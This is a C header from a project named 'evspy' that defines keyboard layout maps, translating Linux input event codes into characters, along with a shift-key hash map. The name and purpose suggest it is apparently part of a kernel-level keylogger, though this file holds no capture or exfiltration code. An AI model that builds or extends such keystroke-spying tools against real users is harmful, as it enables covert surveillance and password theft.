/*
 * ## KEYBOARD LAYOUT MAPS ##
 *
 * Each map is an array where the content of each position is the key value
 * associated with the event code (index). An special/unknown key is represented
 * as a dot ('.'). The dot key itself has its own macro (KEY_DOT).
 *
 * By the moment, evspy does not support non-ascii characters.
 *
 * Select your map with EVS_MAP macro in evspy-core.h
 */

#ifndef __EVS_MAPS
#define __EVS_MAPS

#include <linux/input.h>
#include "../khashmap/khashmap.h"

#define EVS_SHIFT(KEY, VALUE)	khm_insert(shm, (KEY), (VALUE))

static struct khashmap *shm;

static inline void exit_map(void)
{
	khm_destroy(shm);
}

static inline void init_shiftmap_global(void)
{
	shm = khm_create();
}

#define EVS_KLAY_EN		0
#define EVS_KLAY_ES		1

// Load the map associated with the given keyboard layout
#ifndef EVS_KLAY
#include "map_es.h"		// default layout
#elif EVS_KLAY == EVS_KLAY_EN
#include "map_en.h"
#elif EVS_KLAY == EVS_KLAY_ES
#include "map_es.h"
#endif	// EVS_KLAY

#endif	// __EVS_MAPS
